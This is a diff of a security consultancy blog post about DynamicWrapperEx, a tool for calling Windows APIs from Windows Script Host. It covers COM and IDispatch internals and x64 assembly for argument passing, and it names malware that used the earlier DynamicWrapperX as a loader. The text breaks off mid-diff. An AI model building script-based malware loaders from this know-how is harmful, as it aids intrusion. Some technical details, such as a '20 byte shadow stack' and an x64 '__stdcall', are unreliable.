@@ -2,461 +2,367 @@
 layout: blogpost
 title: "DynamicWrapperEx – Windows API Invocation from Windows Script Host"
 author: "Paul Laîné"
-author_role: "Security Consultant"
+author_role: "Security Consultant, Assurance"
 summary: "The Component Object Model (COM) was a revolutionary specification when it first appeared in 1995, despite this, there is still a large veil of mystery surrounding it. Those who have worked closely with Microsoft Windows systems may have heard of it, but probably in negative terms."
-tags: Security, Tools, Security Assessment and Testing
-hero_banner: DWExWebBanner_850_350_75_s_c1.jpg
+tags: [Security, Tools, Security assessment and testing]
+hero_banner: Downgrade_SPNEGO_Authentication_1010_350_75_s_c1.jpg
 ---
-
+{% raw %}
 <article class="article-content">
-
-                    
-
-                        
-                            
-    <p>In 1998 Jeff Strong wrote a <a href="https://web.archive.org/web/20210413192038/https://www.drdobbs.com/windows/an-automation-object-for-dynamic-dll-cal/210200078">blog post</a>, “An Automation Object for Dynamic DLL Calls”, to showcase an OLE Automation server (subset of COM) written in C++. This component would allow dynamic invocation of methods within dynamic-link libraries (DLLs) from Windows Script Host (WSH); for example, JScript and VBScript. Later in 2008, Yuri Popov (Юрий Попов) released a <a href="https://web.archive.org/web/20210413192038/http://dynwrapx.script-coding.com/dwx/pages/dynwrapx.php?lang=en">tool named DynamicWrapperX</a> inspired by Jeff’s work, which was written in GoAsm assembly but the source code was never released.</p>
-
+<p>In 1998 Jeff Strong wrote a <a href="https://www.drdobbs.com/windows/an-automation-object-for-dynamic-dll-cal/210200078">blog post</a>, “An Automation Object for Dynamic DLL Calls”, to showcase an OLE Automation server (subset of COM) written in C++. This component would allow dynamic invocation of methods within dynamic-link libraries (DLLs) from Windows Script Host (WSH); for example, JScript and VBScript. Later in 2008, Yuri Popov (Юрий Попов) released a <a href="http://dynwrapx.script-coding.com/dwx/pages/dynwrapx.php?lang=en">tool named DynamicWrapperX</a> inspired by Jeff’s work, which was written in GoAsm assembly but the source code was never released.</p>
 <p>Over the years, multiple threat actors, malware developers and subsequently people working within simulated attack operations used DynamicWrapperX for the first stage of malware delivery. To name a few:</p>
-
 <ul>
-<li>zerosum0x0’s <a href="https://web.archive.org/web/20210413192038/https://github.com/zerosum0x0/koadic">Koadic C3 COM Command &amp; Control</a> - JScript RAT</li>
-<li><a href="https://web.archive.org/web/20210413192038/https://securelist.com/a-malicious-pairing-of-cryptor-and-stealer/76039/">RAA JCcript ransomware and stealer</a></li>
+<li>zerosum0x0’s <a href="https://github.com/zerosum0x0/koadic">Koadic C3 COM Command &amp; Control</a> - JScript RAT</li>
+<li><a href="https://securelist.com/a-malicious-pairing-of-cryptor-and-stealer/76039/">RAA JCcript ransomware and stealer</a></li>
 <li>&lt; href="https://unit42.paloaltonetworks.com/unit42-houdinis-magic-reappearance/"&gt;HWorm/Houdine VBS Loader</li>
 </ul>
-
 <p>(Un)Fortunately, nowadays, many signatures and rules exist for DynamicWrapperX.</p>
-
-<p>A tool named DynamicWrapperEx has been developed and published on GitHub. The source code for this project can be found at the following location: <a href="https://web.archive.org/web/20210413192038/https://github.com/ctxis/DynamicWrapperEx">https://github.com/ctxis/DynamicWrapperEx</a></p>
-
+<p>A tool named DynamicWrapperEx has been developed and published on GitHub. The source code for this project can be found at the following location: <a href="https://github.com/ctxis/DynamicWrapperEx">https://github.com/ctxis/DynamicWrapperEx</a></p>
 <p>This will be used to support this blog post, which focusses on the underlying technologies that are used to achieve dynamic Windows API calls from the Windows Script Host (WSH).</p>
-
 <p>While this is not an in-depth guide on COM and OLE Automation (both are huge subjects, and it is impossible to cover everything these topics entail in one post), this blog post will initially cover some basics of COM. The remaining sections will be about how to leverage OLE Automation, x64 standard calling convention, registration-free activation, and some of the limitations and security considerations around the use of such tool.</p>
-
-<p>DynamicWrapperEx was presented at the CREST Intelligence-Led Penetration Testing Webinar in November 2020 and a <a href="https://web.archive.org/web/20210413192038/https://youtu.be/JbQyIcIyOvI">recording is available on YouTube</a>.</p>
-
-    <div class="video-wrapper">
-        <iframe width="560" height="315" src="https://web.archive.org/web/20210413192038if_/https://www.youtube-nocookie.com/embed/JbQyIcIyOvI" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe>
-    </div>
-
-    <h2>COM and OLE Automation Basics</h2>
-
-    <p>The first version of Object Linking and Embedding (OLE), from 1992, was created as an improvement over its predecessors Dynamic Data Exchange (DDE) and clipboard technologies. It essentially allowed the use of smart components that can update themselves. COM is the successor of OLE technology. From 1995, OLE faded away to let the COM specification open the door to customisable and flexible component-driven applications.</p>
-
+<p>DynamicWrapperEx was presented at the CREST Intelligence-Led Penetration Testing Webinar in November 2020 and a <a href="https://youtu.be/JbQyIcIyOvI">recording is available on YouTube</a>.</p>
+<div class="video-wrapper">
+<iframe allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen="" frameborder="0" height="315" src="https://web.archive.org/web/20210413192038if_/https://www.youtube-nocookie.com/embed/JbQyIcIyOvI" width="560"></iframe>
+</div>
+<h2>COM and OLE Automation Basics</h2>
+<p>The first version of Object Linking and Embedding (OLE), from 1992, was created as an improvement over its predecessors Dynamic Data Exchange (DDE) and clipboard technologies. It essentially allowed the use of smart components that can update themselves. COM is the successor of OLE technology. From 1995, OLE faded away to let the COM specification open the door to customisable and flexible component-driven applications.</p>
 <p>When an application uses a COM component it is known as a COM client, while the components themselves are known as COM servers. These components are composed of interfaces, which can be defined as a memory structure that has an array of function pointers. In C++, this structure can be obtained at compilation by creating a pure virtual class, also known as abstract class. A pure virtual class is not providing any implementation details, but instead defines the shape, structure, and behaviour of the interface. Classes that derive from the interface (i.e. interface inheritance) must subsequently provide the implementation of the methods.</p>
-
 <p>Why is an interface important? The answer is that interfaces are required for polymorphism. Polymorphism comes from Ancient Greek, meaning “many forms”. In programming, this is achieved when the same operation (e.g. function), is applied on different types or classes. In more concrete terms this means that if multiple classes derive from the same interface, any client that wants to instantiate any of these classes will be able to use the exact same operations. By deriving from the same interface, this will enforce a unified way to instantiate and subsequently allow COM clients to use COM servers. In this case, COM interfaces all derive from the <strong>IUnknown</strong> interface.</p>
-
 <p>Automation, also known as OLE Automation, has been developed as a subset of COM and was designed to be used by scripting languages such as JScript, VBScript, and later Visual Basic for Applications. The objective, as the name implies, was to offer a certain level of automation by providing a new way to communicate with COM components.</p>
-
 <p>An Automation server will be a COM component that derives and implements the <strong>IDispatch</strong> interface (which also derives from <strong>IUnknown</strong>), whereas the Automation controller will be a COM client that interacts with an Automation server.</p>
-
-    <h2>Leveraging OLE Automation</h2>
-
-    <p>An Automation controller (COM clients implementing OLE Automation standard) provides a new way to communicate with Automation servers (COM servers implementing OLE Automation standard), which in this case will come in handy. Before explaining why, it is important to have a look at how to implement the <strong>IDispatch</strong> Interface. As shown below, there are seven methods in total. First three being from the <strong>IUnknown</strong> interface.</p>
-
-    <pre class="prettyprint prettyprinted" style=""><span class="com">/** 
+<h2>Leveraging OLE Automation</h2>
+<p>An Automation controller (COM clients implementing OLE Automation standard) provides a new way to communicate with Automation servers (COM servers implementing OLE Automation standard), which in this case will come in handy. Before explaining why, it is important to have a look at how to implement the <strong>IDispatch</strong> Interface. As shown below, there are seven methods in total. First three being from the <strong>IUnknown</strong> interface.</p>
+<pre class="prettyprint">/** 
 * @brief {F757F2EC-62D8-4BAE-8BE0-0A61CF36A541} 
-*/</span><span class="pln"> 
-</span><span class="kwd">static</span><span class="pln"> CONST GUID IID_IDynamicWrapperEx </span><span class="pun">=</span><span class="pln"> </span><span class="pun">{</span><span class="pln"> </span><span class="lit">0xf757f2ec</span><span class="pln"> </span><span class="pun">,</span><span class="pln"> </span><span class="lit">0x62d8</span><span class="pun">,</span><span class="pln"> </span><span class="lit">0x4bae</span><span class="pln"> </span><span class="pun">,</span><span class="pln"> </span><span class="pun">{</span><span class="lit">0x8b</span><span class="pun">,</span><span class="pln"> </span><span class="lit">0xe0</span><span class="pun">,</span><span class="pln"> </span><span class="lit">0xa</span><span class="pun">,</span><span class="pln"> </span><span class="lit">0x61</span><span class="pun">,</span><span class="pln"> </span><span class="lit">0xcf</span><span class="pun">,</span><span class="pln"> </span><span class="lit">0x36</span><span class="pun">,</span><span class="pln"> </span><span class="lit">0xa5</span><span class="pun">,</span><span class="pln"> </span><span class="lit">0x41</span><span class="pun">}</span><span class="pln"> </span><span class="pun">};</span><span class="pln"> 
+*/ 
+static CONST GUID IID_IDynamicWrapperEx = { 0xf757f2ec , 0x62d8, 0x4bae , {0x8b, 0xe0, 0xa, 0x61, 0xcf, 0x36, 0xa5, 0x41} }; 
+  
+class IDynamicWrapperEx : public IDispatch { 
+public: 
+    // Inherited via IUnknown 
+    virtual HRESULT STDMETHODCALLTYPE QueryInterface(REFIID riid, void** ppvObject) = 0; 
+    virtual ULONG   STDMETHODCALLTYPE AddRef(void) = 0; 
+    virtual ULONG   STDMETHODCALLTYPE Release(void) = 0; 
+  
+    // Inherited via IDispatch 
+    virtual HRESULT STDMETHODCALLTYPE GetTypeInfoCount(
+UINT* pctinfo
+    ) = 0; 
 
-</span><span class="kwd">class</span><span class="pln"> </span><span class="typ">IDynamicWrapperEx</span><span class="pln"> </span><span class="pun">:</span><span class="pln"> </span><span class="kwd">public</span><span class="pln"> </span><span class="typ">IDispatch</span><span class="pln"> </span><span class="pun">{</span><span class="pln"> 
-</span><span class="kwd">public</span><span class="pun">:</span><span class="pln"> 
-</span><span class="com">// Inherited via IUnknown </span><span class="pln">
-</span><span class="kwd">virtual</span><span class="pln"> HRESULT STDMETHODCALLTYPE </span><span class="typ">QueryInterface</span><span class="pun">(</span><span class="pln">REFIID riid</span><span class="pun">,</span><span class="pln"> </span><span class="kwd">void</span><span class="pun">**</span><span class="pln"> ppvObject</span><span class="pun">)</span><span class="pln"> </span><span class="pun">=</span><span class="pln"> </span><span class="lit">0</span><span class="pun">;</span><span class="pln"> 
-</span><span class="kwd">virtual</span><span class="pln"> ULONG   STDMETHODCALLTYPE </span><span class="typ">AddRef</span><span class="pun">(</span><span class="kwd">void</span><span class="pun">)</span><span class="pln"> </span><span class="pun">=</span><span class="pln"> </span><span class="lit">0</span><span class="pun">;</span><span class="pln"> 
-</span><span class="kwd">virtual</span><span class="pln"> ULONG   STDMETHODCALLTYPE </span><span class="typ">Release</span><span class="pun">(</span><span class="kwd">void</span><span class="pun">)</span><span class="pln"> </span><span class="pun">=</span><span class="pln"> </span><span class="lit">0</span><span class="pun">;</span><span class="pln"> 
+    virtual HRESULT STDMETHODCALLTYPE GetTypeInfo(
+UINT        iTInfo,
+LCID        lcid,
+ITypeInfo** ppTInfo
+    ) = 0; 
 
-</span><span class="com">// Inherited via IDispatch </span><span class="pln">
-</span><span class="kwd">virtual</span><span class="pln"> HRESULT STDMETHODCALLTYPE </span><span class="typ">GetTypeInfoCount</span><span class="pun">(</span><span class="pln">
-UINT</span><span class="pun">*</span><span class="pln"> pctinfo
-</span><span class="pun">)</span><span class="pln"> </span><span class="pun">=</span><span class="pln"> </span><span class="lit">0</span><span class="pun">;</span><span class="pln"> 
+    virtual HRESULT STDMETHODCALLTYPE GetIDsOfNames(
+REFIID    riid,
+LPOLESTR* rgszNames,
+UINT      cNames,
+LCID      lcid,
+DISPID*   rgDispId
+    ) = 0; 
 
-</span><span class="kwd">virtual</span><span class="pln"> HRESULT STDMETHODCALLTYPE </span><span class="typ">GetTypeInfo</span><span class="pun">(</span><span class="pln">
-UINT        iTInfo</span><span class="pun">,</span><span class="pln">
-LCID        lcid</span><span class="pun">,</span><span class="pln">
-</span><span class="typ">ITypeInfo</span><span class="pun">**</span><span class="pln"> ppTInfo
-</span><span class="pun">)</span><span class="pln"> </span><span class="pun">=</span><span class="pln"> </span><span class="lit">0</span><span class="pun">;</span><span class="pln"> 
-
-</span><span class="kwd">virtual</span><span class="pln"> HRESULT STDMETHODCALLTYPE </span><span class="typ">GetIDsOfNames</span><span class="pun">(</span><span class="pln">
-REFIID    riid</span><span class="pun">,</span><span class="pln">
-LPOLESTR</span><span class="pun">*</span><span class="pln"> rgszNames</span><span class="pun">,</span><span class="pln">
-UINT      cNames</span><span class="pun">,</span><span class="pln">
-LCID      lcid</span><span class="pun">,</span><span class="pln">
-DISPID</span><span class="pun">*</span><span class="pln">   rgDispId
-</span><span class="pun">)</span><span class="pln"> </span><span class="pun">=</span><span class="pln"> </span><span class="lit">0</span><span class="pun">;</span><span class="pln"> 
-
-</span><span class="kwd">virtual</span><span class="pln"> HRESULT STDMETHODCALLTYPE </span><span class="typ">Invoke</span><span class="pun">(</span><span class="pln">
-DISPID      dispIdMember</span><span class="pun">,</span><span class="pln">
-REFIID      riid</span><span class="pun">,</span><span class="pln">
-LCID        lcid</span><span class="pun">,</span><span class="pln">
-WORD        wFlags</span><span class="pun">,</span><span class="pln">
-DISPPARAMS</span><span class="pun">*</span><span class="pln"> pDispParams</span><span class="pun">,</span><span class="pln">
-VARIANT</span><span class="pun">*</span><span class="pln">    pVarResult</span><span class="pun">,</span><span class="pln">
-EXCEPINFO</span><span class="pun">*</span><span class="pln">  pExcepInfo</span><span class="pun">,</span><span class="pln">
-UINT</span><span class="pun">*</span><span class="pln">       puArgErr
-</span><span class="pun">)</span><span class="pln"> </span><span class="pun">=</span><span class="pln"> </span><span class="lit">0</span><span class="pun">;</span><span class="pln"> 
-
-</span><span class="kwd">private</span><span class="pun">:</span><span class="pln"> 
-DWORD m_dwReference </span><span class="pun">=</span><span class="pln"> </span><span class="lit">0</span><span class="pun">;</span><span class="pln"> 
-</span><span class="pun">};</span></pre>
-
-    <p>The reason this will come in handy is that the <strong>GetIDsOfNames</strong> and <strong>Invoke</strong> methods will allow introspection and reflection. They are respectively, the ability to examine type and properties of an object at runtime (e.g. ourselves) and to modify properties and attributes at runtime (e.g. adding a new method).</p>
-
+    virtual HRESULT STDMETHODCALLTYPE Invoke(
+DISPID      dispIdMember,
+REFIID      riid,
+LCID        lcid,
+WORD        wFlags,
+DISPPARAMS* pDispParams,
+VARIANT*    pVarResult,
+EXCEPINFO*  pExcepInfo,
+UINT*       puArgErr
+    ) = 0; 
+  
+private: 
+    DWORD m_dwReference = 0; 
+};</pre>
+<p>The reason this will come in handy is that the <strong>GetIDsOfNames</strong> and <strong>Invoke</strong> methods will allow introspection and reflection. They are respectively, the ability to examine type and properties of an object at runtime (e.g. ourselves) and to modify properties and attributes at runtime (e.g. adding a new method).</p>
 <p>Both methods are important and are the keystone of this new “in two-steps” communication model. When executing a COM server in a Windows Script Host (WSH) context and compared to procedural languages like C or C++ there are no header files that provide declaration details. In other words, this means that the Automation controller has no clear information about what it is manipulating apart from knowing that this is an Automation server with both <strong>GetIDsOfNames</strong> and <strong>Invoke</strong> methods exposed.</p>
-
-<p>First, the<strong> GetIDsOfNames</strong> function is called by the Automation controller, to check whether a function or property exits. The name of the property,or the function, is passed via the second parameter of the function (i.e. <strong>rgszNames</strong>). If the name of the function or property is unknown, the method will return the <strong>DISP_E_UNKNOWNNAME </strong>error code and the dispatch ID (i.e. <strong>rgDispId</strong>) will be set to zero. If the name exists, the method will return <strong>S_OK</strong> and the corresponding dispatch ID.&nbsp;</p>
-
+<p>First, the<strong> GetIDsOfNames</strong> function is called by the Automation controller, to check whether a function or property exits. The name of the property,or the function, is passed via the second parameter of the function (i.e. <strong>rgszNames</strong>). If the name of the function or property is unknown, the method will return the <strong>DISP_E_UNKNOWNNAME </strong>error code and the dispatch ID (i.e. <strong>rgDispId</strong>) will be set to zero. If the name exists, the method will return <strong>S_OK</strong> and the corresponding dispatch ID. </p>
 <p>The following screenshot shows the JScript Automation controller calling <strong>GetIDsOfNames</strong> to get the dispatch ID of a function named <strong>DwRegister</strong>:</p>
-
-    <figure class="img-width-2-3">
-        <div class="modal-img-container">
-            <picture>
-                <!--[if IE 9]><video style="display: none;"><![endif]-->
-                <source srcset="/web/20210413192038im_/https://www.contextis.com/media/images/made/media/images/content/DWExPicture1_800_322_s_c1.png" media="(min-width: 768px)">
-                <!--[if IE 9]></video><![endif]-->
-                <img srcset="/web/20210413192038im_/https://www.contextis.com/media/images/made/media/images/content/DWExPicture1_800_322_s_c1.png" alt="">
-            </picture>
-            <div class="modal-hover">
-                <a class="modal-img hidden-xs" href="/web/20210413192038/https://www.contextis.com/media/images/content/DWExPicture1.png"></a>
-                <a class="modal-img visible-xs" href="/web/20210413192038/https://www.contextis.com/media/images/made/media/images/content/DWExPicture1_800_322.png"></a>
-            </div>
-        </div><!-- /modal-img-container -->
-   </figure>
-
-    <p>Once the Automation controller knows that the function or property exists, the <strong>Invoke</strong> method is called to execute a function, modify, or read a property. The first parameter <strong>dispIdMember</strong> is the dispatch ID, the second parameter <strong>riid</strong> must be null, and the third parameter <strong>lcid</strong> is the local identifier.</p>
-
+<figure class="img-width-2-3">
+<div class="modal-img-container">
+<picture>
+<!--[if IE 9]><video style="display: none;"><![endif]-->
+<source media="(min-width: 768px)" srcset="/blog/assets/media/DWExPicture1_800_322_s_c1.png"/>
+<!--[if IE 9]></video><![endif]-->
+<img alt="" srcset="/blog/assets/media/DWExPicture1_800_322_s_c1.png"/>
+</picture>
+<div class="modal-hover">
+<a class="modal-img hidden-xs" href="/web/20210413192038/https://www.contextis.com/media/images/content/DWExPicture1.png"></a>
+<a class="modal-img visible-xs" href="/blog/assets/media/DWExPicture1_800_322.png"></a>
+</div>
+</div><!-- /modal-img-container -->
+</figure>
+<p>Once the Automation controller knows that the function or property exists, the <strong>Invoke</strong> method is called to execute a function, modify, or read a property. The first parameter <strong>dispIdMember</strong> is the dispatch ID, the second parameter <strong>riid</strong> must be null, and the third parameter <strong>lcid</strong> is the local identifier.</p>
 <p>To understand the remaining parameters, it is important to understand that <strong>Invoke</strong> is a generic method that is used to execute other functions, modify, or get a property. As a result, the method needs a generic way to describe the type of action that will be conducted as well as the parameters and the return value, if any. The type of action is a flag and is defined in the fourth parameter <strong>wFlags</strong>. One of the following values is expected:</p>
-
 <ul>
 <li>DISPATCH_METHOD – to execute a function</li>
 <li>DISPATCH_PROPERTYGET – to get the value of a property</li>
-<li>DISPATCH_PROPERTYPUT – to change the value of a property; and&nbsp;</li>
+<li>DISPATCH_PROPERTYPUT – to change the value of a property; and </li>
 <li>DISPATCH_PROPERTYPUTREF – to change the value of a property by reference.</li>
 </ul>
-
-<p>At runtime, the Automation server has no knowledge of the type of parameters and the return values that are expected. Therefore, a generic way to store this information is required for runtime type identification and data storage. This is exactly what the <a href="https://web.archive.org/web/20210413192038/https://docs.microsoft.com/en-us/windows/win32/api/oaidl/ns-oaidl-variant">VARIANT</a> structure is used for.</p>
-
+<p>At runtime, the Automation server has no knowledge of the type of parameters and the return values that are expected. Therefore, a generic way to store this information is required for runtime type identification and data storage. This is exactly what the <a href="https://docs.microsoft.com/en-us/windows/win32/api/oaidl/ns-oaidl-variant">VARIANT</a> structure is used for.</p>
 <p>The fifth parameter, <strong>pDispParams,</strong> is a <strong>DISPPARAMS</strong> structure. This contains an array of <strong>VARIANT</strong>. The array of <strong>VARIANT</strong> is populated with the parameters from the script:</p>
-
-    <pre class="prettyprint prettyprinted" style=""><span class="kwd">typedef</span><span class="pln"> </span><span class="kwd">struct</span><span class="pln"> tagDISPPARAMS </span><span class="pun">{</span><span class="pln">
-VARIANTARG </span><span class="pun">*</span><span class="pln">rgvarg</span><span class="pun">;</span><span class="pln">
-DISPID     </span><span class="pun">*</span><span class="pln">rgdispidNamedArgs</span><span class="pun">;</span><span class="pln">
-UINT       cArgs</span><span class="pun">;</span><span class="pln">
-UINT       cNamedArgs</span><span class="pun">;</span><span class="pln">
-</span><span class="pun">}</span><span class="pln"> DISPPARAMS</span><span class="pun">;</span></pre>
-
-    <p>The sixth parameter, <strong>pVarResult,</strong> is a simple <strong>VARIANT</strong> used to store the return value of the function. The remaining two parameters <strong>pExcepInfo</strong> and <strong>puArgErr,</strong> are used for exception and error handling (not covered within this blog).</p>
-
+<pre class="prettyprint">typedef struct tagDISPPARAMS {
+    VARIANTARG *rgvarg;
+    DISPID     *rgdispidNamedArgs;
+    UINT       cArgs;
+    UINT       cNamedArgs;
+} DISPPARAMS;</pre>
+<p>The sixth parameter, <strong>pVarResult,</strong> is a simple <strong>VARIANT</strong> used to store the return value of the function. The remaining two parameters <strong>pExcepInfo</strong> and <strong>puArgErr,</strong> are used for exception and error handling (not covered within this blog).</p>
 <p>Consequently, both <strong>GetIDsOfNames </strong>and <strong>Invoke</strong> methods can be used to generate and execute new classes and methods at runtime. This provides a way to extend the capabilities of the Automation server at runtime.</p>
-
 <p>In this case, <strong>DynamicWrapperEx </strong>maintains a list of <strong>DynamicMethod </strong>classes (each class being a wrapper around a Windows API) and has a utility class named <strong>AutomationFactory</strong>. Amongst other things, this utility class has a method called <strong>Register</strong> with a hard-coded dispatch ID of zero. This method is responsible for registering new Windows APIs and updating the list of <strong>DynamicMethod </strong>classes. The list will then be parsed to check whether a Windows API has been registered and therefore can be executed.</p>
-
 <p>Ultimately, each <strong>DynamicMethod </strong>class has one method called <strong>Invoke</strong> and three properties (i.e., <strong>m_dwDispatchId</strong>, <strong>m_bstrFunctionName</strong> and <strong>m_lpFunction</strong>). These properties are, respectively, the dispatch ID of the class, the Unicode name, and the address in the virtual private memory of the process of the Windows API. The Invoke function will be responsible for implementing the correct calling convention (i.e. properly setting the parameters on the stack), calling the API, and returning the value.</p>
-
-    <h2>x86_64 Standard Calling Convention</h2>
-
-    <p>There are many calling conventions that have been used over the years. Some of them are standards (e.g., C and standard) and some of them are now obsolete (e.g., Pascal, Fortran and syscall). Calling conventions are very important because they dictate the order of a parameter passing to a routine upon execution, who will be responsible for cleaning the stack and the name decoration of internal object and classes.</p>
-
+<h2>x86_64 Standard Calling Convention</h2>
+<p>There are many calling conventions that have been used over the years. Some of them are standards (e.g., C and standard) and some of them are now obsolete (e.g., Pascal, Fortran and syscall). Calling conventions are very important because they dictate the order of a parameter passing to a routine upon execution, who will be responsible for cleaning the stack and the name decoration of internal object and classes.</p>
 <p>Additionally, the process of calling a routine in x86_64 is different than in x86. Firstly, x86_64 introduced the shadow stack, which is automatically allocated space (20 bytes) for the called routine to save registers. Secondly, compared to x86, the first four parameters are passed in registers left to right while the remaining parameters are passed in the stack from right to left. Integer arguments are passed via the RCX, RDX, R8 and R9 general-purpose registers (GPRs), while the floating-point parameters are passed via the XMM0, XMM1, XMM2 and XMM3 registers which are the Streaming SIMD Extensions 2 (SSE2) registers. This tool has been designed to solely interact with Windows APIs on an x64 architecture; therefore, this section focuses on the x86_64 standard calling convention (i.e. __stdcall).</p>
-
 <p>As mentioned in the previous section, a <strong>DynamicMethod </strong>class is a wrapper around a Window API and has a method called <strong>Invoke</strong>. This method will create a packed structure with all the parameters and then will call the <strong>DynamicCall</strong> routine written in assembly. The routine has been developed in assembly because it is the easiest, if not the only, way to manipulate the stack and fully control the registers.</p>
-
 <p>The logic is simple. The routine goes through each parameter one by one (i.e. via the RAX register), and pushes them into the stack or moves them into the registers according to their position.</p>
-
 <p>To do that, it first needs to check whether the position is lower or equal to four, in which case the parameter is moved into the general-purpose registers (i.e., shadow stack). Otherwise, it is pushed in reverse order to the stack.</p>
+<pre class="prettyprint">.parse_arguments:
+    mov eax, dword [dwArguments]      ; Total number of arguments 
+    dec rax                           ; Index start to 0, hence -1 
+    imul rax, rax, 10h                ; Calculate argument index
 
-    <pre class="prettyprint prettyprinted" style=""><span class="pun">.</span><span class="pln">parse_arguments</span><span class="pun">:</span><span class="pln">
-mov eax</span><span class="pun">,</span><span class="pln"> dword </span><span class="pun">[</span><span class="pln">dwArguments</span><span class="pun">]</span><span class="pln">      </span><span class="pun">;</span><span class="pln"> </span><span class="typ">Total</span><span class="pln"> number of arguments 
-dec rax                           </span><span class="pun">;</span><span class="pln"> </span><span class="typ">Index</span><span class="pln"> start to </span><span class="lit">0</span><span class="pun">,</span><span class="pln"> hence </span><span class="pun">-</span><span class="lit">1</span><span class="pln"> 
-imul rax</span><span class="pun">,</span><span class="pln"> rax</span><span class="pun">,</span><span class="pln"> </span><span class="lit">10h</span><span class="pln">                </span><span class="pun">;</span><span class="pln"> </span><span class="typ">Calculate</span><span class="pln"> argument index
+    add rax, qword [lpTableArguments] ; EAX = PArgument
+    mov ebx, [rax + Argument.dwSize]  ; 
 
-</span><span class="kwd">add</span><span class="pln"> rax</span><span class="pun">,</span><span class="pln"> qword </span><span class="pun">[</span><span class="pln">lpTableArguments</span><span class="pun">]</span><span class="pln"> </span><span class="pun">;</span><span class="pln"> EAX </span><span class="pun">=</span><span class="pln"> </span><span class="typ">PArgument</span><span class="pln">
-mov ebx</span><span class="pun">,</span><span class="pln"> </span><span class="pun">[</span><span class="pln">rax </span><span class="pun">+</span><span class="pln"> </span><span class="typ">Argument</span><span class="pun">.</span><span class="pln">dwSize</span><span class="pun">]</span><span class="pln">  </span><span class="pun">;</span><span class="pln"> 
+    cmp dword [dwArguments], 4h       ; Check if shadow stack or stack
+    jle .shadow_stack                 ;</pre>
+<p>Starting at RSP + 0x20 bytes, the position in the stack can be easily calculated when the total number of parameters and the current position of the parameter is known. Once the offset in the stack has been calculated the value is moved. Example below:</p>
+<pre class="prettyprint">mov ebx, dword [dwArguments]                    ; EBX = number of arguments
+    sub rbx, 5h                                     ; EBX - shadow stack parameters - 1
+    imul rbx, rbx, 8h                               ; EBX = 8 * EBX
 
-cmp dword </span><span class="pun">[</span><span class="pln">dwArguments</span><span class="pun">],</span><span class="pln"> </span><span class="lit">4h</span><span class="pln">       </span><span class="pun">;</span><span class="pln"> </span><span class="typ">Check</span><span class="pln"> </span><span class="kwd">if</span><span class="pln"> shadow stack </span><span class="kwd">or</span><span class="pln"> stack
-jle </span><span class="pun">.</span><span class="pln">shadow_stack                 </span><span class="pun">;</span></pre>
+    add rbx, 20h                                    ; EBX = EBX + 20h
+    add rbx, rsp                                    ; EBX = position in the stack
 
-    <p>Starting at RSP + 0x20 bytes, the position in the stack can be easily calculated when the total number of parameters and the current position of the parameter is known. Once the offset in the stack has been calculated the value is moved. Example below:</p>
-
-    <pre class="prettyprint prettyprinted" style=""><span class="pln">mov ebx</span><span class="pun">,</span><span class="pln"> dword </span><span class="pun">[</span><span class="pln">dwArguments</span><span class="pun">]</span><span class="pln">                    </span><span class="pun">;</span><span class="pln"> EBX </span><span class="pun">=</span><span class="pln"> number of arguments
-</span><span class="kwd">sub</span><span class="pln"> rbx</span><span class="pun">,</span><span class="pln"> </span><span class="lit">5h</span><span class="pln">                                     </span><span class="pun">;</span><span class="pln"> EBX </span><span class="pun">-</span><span class="pln"> shadow stack parameters </span><span class="pun">-</span><span class="pln"> </span><span class="lit">1</span><span class="pln">
-imul rbx</span><span class="pun">,</span><span class="pln"> rbx</span><span class="pun">,</span><span class="pln"> </span><span class="lit">8h</span><span class="pln">                               </span><span class="pun">;</span><span class="pln"> EBX </span><span class="pun">=</span><span class="pln"> </span><span class="lit">8</span><span class="pln"> </span><span class="pun">*</span><span class="pln"> EBX
-
-</span><span class="kwd">add</span><span class="pln"> rbx</span><span class="pun">,</span><span class="pln"> </span><span class="lit">20h</span><span class="pln">                                    </span><span class="pun">;</span><span class="pln"> EBX </span><span class="pun">=</span><span class="pln"> EBX </span><span class="pun">+</span><span class="pln"> </span><span class="lit">20h</span><span class="pln">
-</span><span class="kwd">add</span><span class="pln"> rbx</span><span class="pun">,</span><span class="pln"> rsp                                    </span><span class="pun">;</span><span class="pln"> EBX </span><span class="pun">=</span><span class="pln"> position </span><span class="kwd">in</span><span class="pln"> the stack
-
-</span><span class="kwd">and</span><span class="pln"> dword </span><span class="pun">[</span><span class="pln">rax </span><span class="pun">+</span><span class="pln"> </span><span class="typ">Argument</span><span class="pun">.</span><span class="pln">dwFlag</span><span class="pun">],</span><span class="pln"> ARGUMENT_FLT </span><span class="pun">;</span><span class="pln"> </span><span class="typ">Check</span><span class="pln"> </span><span class="kwd">if</span><span class="pln"> floating point </span><span class="kwd">value</span><span class="pln">
-jnz </span><span class="pun">.</span><span class="pln">stack_xmmx
-mov r10</span><span class="pun">,</span><span class="pln"> </span><span class="pun">[</span><span class="pln">rax </span><span class="pun">+</span><span class="pln"> </span><span class="typ">Argument</span><span class="pun">.</span><span class="kwd">value</span><span class="pun">]</span><span class="pln">                 </span><span class="pun">;</span><span class="pln"> </span><span class="typ">Decimal</span><span class="pln"> </span><span class="kwd">value</span><span class="pln">
-mov qword </span><span class="pun">[</span><span class="pln">rbx</span><span class="pun">],</span><span class="pln"> r10                            </span><span class="pun">;</span><span class="pln"> </span><span class="typ">Push</span><span class="pln"> </span><span class="kwd">value</span><span class="pln"> to the stack
-jmp </span><span class="pun">.</span><span class="kwd">next</span><span class="pln">                                       </span><span class="pun">;</span><span class="pln">
-</span><span class="pun">.</span><span class="pln">stack_xmmx</span><span class="pun">:</span><span class="pln">
-movsd xmm5</span><span class="pun">,</span><span class="pln"> </span><span class="pun">[</span><span class="pln">rax </span><span class="pun">+</span><span class="pln"> </span><span class="typ">Argument</span><span class="pun">.</span><span class="kwd">value</span><span class="pun">]</span><span class="pln">              </span><span class="pun">;</span><span class="pln"> </span><span class="typ">Floating</span><span class="pln"> pointer </span><span class="kwd">value</span><span class="pln">
-movsd </span><span class="pun">[</span><span class="pln">rbx</span><span class="pun">],</span><span class="pln"> xmm5                               </span><span class="pun">;</span><span class="pln"> </span><span class="typ">Push</span><span class="pln"> </span><span class="kwd">value</span><span class="pln"> to the stack
-jmp </span><span class="pun">.</span><span class="kwd">next</span><span class="pln">                                       </span><span class="pun">;</span></pre>
-
-    <p>Please note that a special check is required if the parameter is a floating point. Instructions and subsequently mnemonics to manipulate floating point registers and standard values/registers are not the same.</p>
-
+    and dword [rax + Argument.dwFlag], ARGUMENT_FLT ; Check if floating point value
